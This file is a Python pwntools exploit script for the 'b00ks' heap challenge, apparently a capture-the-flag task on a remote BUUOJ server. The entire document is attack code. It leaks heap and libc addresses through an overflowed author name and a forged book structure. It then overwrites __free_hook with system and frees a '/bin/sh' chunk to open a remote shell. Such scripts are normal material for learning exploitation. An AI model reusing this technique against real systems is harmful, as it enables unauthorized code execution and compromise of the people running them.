from pwn import *

# context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('b00ks')
io = remote('node4.buuoj.cn', 28235)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('b00ks')


def add(name_size, name, description_size, description):
    io.sendlineafter('> ', '1')
    io.sendlineafter('\nEnter book name size: ', str(name_size))
    io.sendlineafter('Enter book name (Max 32 chars): ', name)
    io.sendlineafter('\nEnter book description size: ', str(description_size))
    io.sendlineafter('Enter book description: ', description)


def delete(id):
    io.sendlineafter('> ', '2')
    io.sendlineafter('Enter the book id you want to delete: ', str(id))


def edit(id, description):
    io.sendlineafter('> ', '3')
    io.sendlineafter('Enter the book id you want to edit: ', str(id))
    io.sendlineafter('Enter new book description: ', description)


def show():
    io.sendlineafter('> ', '4')


def leak():
    global heap_base, libc_base
    io.sendlineafter('Enter author name: ', 'a' * 0x20)
    add(0xd0, 'a' * 0xd0, 0x20, 'a' * 0x20)
    add(0x200000, 'a' * 0x20, 0x20, 'a' * 0x20)
    add(0x18, '/bin/sh\x00', 0x18, '/bin/sh\x00')
    show()
    io.recvuntil('Author: ' + 'a' * 0x20)
    heap_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x1130
    log.success('heap_base: ' + hex(heap_base))
    payload = p64(1) + p64(heap_base + 0x1198) + p64(heap_base + 0x11a0) + p64(0x20)
    edit(1, payload)
    io.sendlineafter('> ', '5')
    io.sendlineafter('Enter author name: ', 'a' * 0x20)
    show()
    io.recvuntil('Name: ')
    libc_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) + 0x200ff0
    log.success('libc_base: ' + hex(libc_base))
    # gdb.attach(io)
    # pause()


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    edit(1, p64(__free_hook)[:7])
    edit(2, p64(system))
    delete(3)
    io.interactive()
    


if __name__ == '__main__':
    leak()
    pwn()
